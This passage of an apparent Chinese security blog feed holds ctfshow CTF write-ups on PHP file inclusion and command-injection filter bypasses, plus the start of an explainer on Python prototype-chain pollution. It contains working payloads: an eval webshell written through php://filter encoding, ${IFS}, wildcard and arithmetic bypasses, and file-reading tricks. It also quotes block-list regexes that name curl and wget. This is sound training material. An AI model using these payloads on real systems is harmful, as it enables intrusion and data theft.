class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes native!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;sp2.mp4&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:video/mp4&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>所以只需要GET传参 (似乎只能直接包含) 就可以直接包含执行了, 可是他啥也没说啊. 那就试试flag.php, 成了; payload如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240707204316890.png" alt="image-20240707204316890"></p><h2 id="web117"><a class="header-anchor" href="#web117">¶</a>web117</h2><ul><li>无描述</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: yu22x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 18:16:59</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>这个也是经典的死亡die了, 但是rot13和base64都给你ban了, 但还有<a href="https://www.cnblogs.com/konglongwu/p/16880784.html">文件包含之 php://filter的convert.iconv.* 绕过</a>, 以及<a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php://filter的各种过滤器</a>, 百八十种编码方式任君选择</p><p>把一句话木马从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码, 我试了挺多方法的可是就是输出不了什么, 那我就直接抄了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;UCS-2LE&quot;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="variable">$temp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;payload:&quot;</span>.<span class="variable">$result</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和之前的步骤大同小异, 密码为1执行命令即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=b.php</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_命令执行_2</title>
      <link href="/article/ctfshow-webbasic-rce-2/"/>
      <url>/article/ctfshow-webbasic-rce-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>命令执行</h1><hr><h2 id="web49"><a class="header-anchor" href="#web49">¶</a>web49</h2><ul><li>描述: 命令执行，需要严格的过滤</li></ul><p>这又是什么power了?</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;fla\g.php||</span><br></pre></td></tr></table></figure><h2 id="web50"><a class="header-anchor" href="#web50">¶</a>web50</h2><ul><li>描述: 同上</li></ul><p><code>\x09</code>是tab键, <code>\x26</code>是&amp;</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;fla\g.php||</span><br></pre></td></tr></table></figure><blockquote><p>不是哥们, 真就一把梭啊</p></blockquote><h2 id="web51"><a class="header-anchor" href="#web51">¶</a>web51</h2><ul><li>描述: 同上</li></ul><p>这下老实了,不给用<code>\</code>和<code>tac</code>了, 那就换一个<code>''</code>和<code>nl</code>, 然后查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><h2 id="web52"><a class="header-anchor" href="#web52">¶</a>web52</h2><ul><li>描述: 同上</li></ul><p>现在<code>&lt;</code>和<code>&gt;</code>也没了, 但是<code>$</code>限时回归,对它使用<code>$&#123;IFS&#125;</code>吧</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>抓到本目录文件下, 却发现flag不见了, 怎么一回事呢, 原来是去了根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/fla&#x27;&#x27;g||</span><br></pre></td></tr></table></figure><h2 id="web53"><a class="header-anchor" href="#web53">¶</a>web53</h2><ul><li>描述: 同上</li></ul><p>怎么把重定向去了?</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla&#x27;&#x27;g.php</span><br></pre></td></tr></table></figure><h2 id="web54"><a class="header-anchor" href="#web54">¶</a>web54</h2><ul><li>描述: 同上</li></ul><p>这又是哪里来的强者了!<code>|.*f.*l.*a.*g.*|</code>这种过滤就是字母不能按过滤的顺序出现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>杜绝了字符拼接, 但是过滤似乎少了个通配符<code>?</code>, payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/bin/?at$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure><p>至于为什么要加上/bin, 因为不是这/bin下似乎还有其他类似的命令, 执行不了cat</p><blockquote><p>Linux 的很多命令存放在 /bin/ 目录下，且可以通过绝对路径来使用，而且支持通配符</p></blockquote><h2 id="web55"><a class="header-anchor" href="#web55">¶</a>web55</h2><ul><li>描述: 同上</li></ul><p>返璞归真, 这下彻底是无字母了; 空格, <code>.</code>和<code>?</code>限时回归</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗?</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>找到了三种方案:</p><ol><li>我们可以通过post一个文件(文件里面的sh命令), 在上传的过程中, 通过<code>.</code>去执行执行这个文件(形成了条件竞争); 一般来说这个文件在linux下保存在<code>/tmp/php??????</code>, 一般后面的6个字符是随机生成的有大小写(可以通过linux的匹配符去匹配); <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">原文</a>以及<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神文章</a></li><li>利用<code>/bin/</code>目录下的<code>base64</code>进行通配符匹配, 获得flag.php文件的base64编码</li><li>利用<code>/usr/bin/</code>下的<code>bzip2</code>命令，先将flag.php文件进行压缩, 然后再将其下载</li></ol><p>先从最简单的第二种和第三种开始:</p><h3 id="第二种"><a class="header-anchor" href="#第二种">¶</a>第二种</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure><p>只需要将所有字母换成通配符<code>?</code>即可, 得到的字符串进行base64解码就能得到flag, 伟大, 无需多言</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240705143515362.png" alt="image-20240705143515362"></p><h3 id="第三种"><a class="header-anchor" href="#第三种">¶</a>第三种</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br></pre></td></tr></table></figure><p>同理,然后访问<code>/flag.php.bz2</code>下载该文件</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240705143904045.png" alt="image-20240705143904045"></p><blockquote><p>需要注意的是, 压缩后似乎原文件没了, 如果到这里你还想复现下一个, 你得重启环境</p></blockquote><h3 id="第一种"><a class="header-anchor" href="#第一种">¶</a>第一种</h3><p>前置知识:</p><ul><li>Linux 中 <code>.</code>(点)命令, 或者叫period, 它的作用和 <code>source</code> 命令一样, 就是用当前的shell执行一个文件中的命令; 通过<code>.</code>去执行sh命令并不需要有执行权限</li><li>只要是PHP网站都可以用上传的方式(默认行为)</li><li>ascii码表中, 大写字母位于<code>@</code>与 <code>[</code>之间, 所以<code>[@-[]</code>是为了匹配所有大写字母</li></ul><p>首先本地创建一个html文件便于构造一个post上传文件的数据包</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>选择一个文件并上传后抓上传包, 然后进行修改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 修改GET部分: </span><br><span class="line">?c=.+/???/????????[@-[]</span><br><span class="line"></span><br><span class="line"># 修改包部分:</span><br><span class="line">#!/bin/sh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240705154443371.png" alt="image-20240705154443371"></p><p>至于为什么有时候没有回显, 因为正则匹配的是全大写字母,如果部分是小写字母会匹配不上</p><p>最后直接将ls修改为<code>cat flag.php</code>就可以拿到flag了</p><blockquote><p>这种方法同样适用于PHP5的时候构造无字母(因为PHP5并不像PHP7支持<code>($a)();</code>这样的方法来执行动态函数, 也就是不支持取反异或等操作)</p><p>p神文章提及了glob通配符(问号也包括在内)的其他使用方法, 例如排除掉某一个位置的特性字符</p></blockquote><h2 id="web56"><a class="header-anchor" href="#web56">¶</a>web56</h2><ul><li>描述: 同上</li></ul><p>掌握了上述三种方法, 我相信你可以完成这题: 无数字无字母就只能用上题的第一种方法了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗?</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="web57"><a class="header-anchor" href="#web57">¶</a>web57</h2><ul><li>描述: 命令执行，需要严格的过滤，已测试，可绕</li></ul><p>有时候我十分佩服出题人, 现在<code>.</code>都没了, 这下老实了?哦只需要构造36</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一种方法用的是<code>$(())</code>的运算, 至于<a href="https://blog.csdn.net/u013402321/article/details/80333272">其他类似括号</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>简单来说，<code>$(())</code> 用来做数学运算, 其中<code>$(($&#123;_&#125;))</code>=0, <code>$((~$(($&#123;_&#125;))))</code>=-1, 所以我们是拼接出-37在进行取反</p><blockquote><p>似乎js也有类似的东西, 不过构造的可以是命令, 比如输出个flag什么的</p></blockquote><h2 id="web58"><a class="header-anchor" href="#web58">¶</a>web58</h2><ul><li>描述: 命令执行，突破禁用函数</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><p>这不就POST嘛, 但是我错了, 他给我<code>passthru(), system(),</code>甚至是反引号都禁了</p><p>怎么办呢, 我用字典扫发现flag.php在本目录下, 只能看看有没有一些函数了, 你别说还真有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">c=readfile(&quot;flag.php&quot;);</span><br><span class="line">c=var_dump(file(&#x27;flag.php&#x27;));</span><br><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br><span class="line">c=show_source(&quot;flag.php&quot;);</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;#一行一行读取</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;#一行一个一个字符取</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</span><br></pre></td></tr></table></figure><p>还有伪协议也是可以的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include($_GET[&#x27;url&#x27;]);# POST</span><br><span class="line">/?url=php://filter/read=convert.base64-encode/resource=flag.php# GET</span><br><span class="line"># 或者直接POST:</span><br><span class="line">c=include &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br></pre></td></tr></table></figure><h2 id="web59"><a class="header-anchor" href="#web59">¶</a>web59</h2><ul><li>描述: 同上</li></ul><p>改的是后台过滤, 不会写在前端, 前端同上一题,不写了</p><p>结果也没过滤多什么, 直接试试上一题的payload就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br></pre></td></tr></table></figure><h2 id="web60-65"><a class="header-anchor" href="#web60-65">¶</a>web60-65</h2><ul><li>描述: 同上</li></ul><p>解题方法也是同上, 看来是直接玩死了</p><h2 id="web66-70"><a class="header-anchor" href="#web66-70">¶</a>web66-70</h2><ul><li>描述: 懒得写</li></ul><p>我还以为payload不能用了, 原来是flag换地方了(扫描器扫不到了), 现在在根目录而且叫做<code>flag.txt</code>了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web71"><a class="header-anchor" href="#web71">¶</a>web71</h2><ul><li>描述: 命令执行，突破禁用函数，求你们别秀了</li></ul><p>似乎对缓冲区进行了一些运算, 显示出来的文件全都是乱码, 但是我们可以直接让后面的代码不执行:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure><p>或者进行一次反向操作得到源代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c5ec61c2-5fd3-4973-8277-71d0522d966d.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;include(&quot;/flag.txt&quot;);echo ~ob_get_contents();&#x27;</span>&#125;</span><br><span class="line">s = requests.post(url, d).content</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(~i &amp; <span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python原型链污染</title>
      <link href="/article/12855/"/>
      <url>/article/12855/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>是什么</h1><p>Python中的原型链污染(Prototype Pollution)是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术</p><p>在 Python中, 对象的属性和方法可以通过原型链继承来获取. 每个对象都有一个原型, 原型上定义了对象可以访问的属性和方法. 当对象访问属性或方法时, 会先在自身查找, 如果找不到就会去原型链上的上级对象中查找, 原型链污染攻击的思路是通过修改对象原型链中的属性, 使得程序在访问属性或方法时得到不符合预期的结果. 常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等</p><blockquote><p>原理和Nodejs原型链污染的根本原理一样, Nodejs是对键值对的控制来进行污染, 而Python则是对类属性值的污染, 且只能对类的属性来进行污染不能够污染类的方法</p></blockquote><h1>条件</h1><p>原型链污染需要merge合并函数，通过递归合并来修改父级属性，CTF中常见的merge函数如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):  <span class="comment"># src为原字典，dst为目标字典</span></span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):  <span class="comment"># 键值对字典形式</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))  <span class="comment"># 递归到字典最后一层</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:  <span class="comment"># class形式</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))  <span class="comment"># 递归到最终的父类</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>我们可以通过对src的控制，来控制dst的值，来达到我们污染的目的</p><p>注意Object类型不能被污染, 会直接报错</p><h1>例子</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, 